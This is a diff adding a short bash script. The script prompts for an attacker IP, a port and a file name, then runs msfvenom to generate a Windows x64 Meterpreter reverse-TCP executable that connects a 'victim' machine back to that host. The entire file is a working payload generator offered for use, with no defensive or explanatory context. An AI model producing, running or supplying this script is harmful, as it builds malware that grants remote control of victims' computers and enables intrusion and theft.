@@ -1,0 +1,5 @@
+read -p 'Enter IP you want victim to connect to: ' ip
+read -p 'Enter Port you want victim to connect to: ' pt
+read -p 'Enter Name of Binary you want to generate: ' file
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$pt -f exe > $file.exe
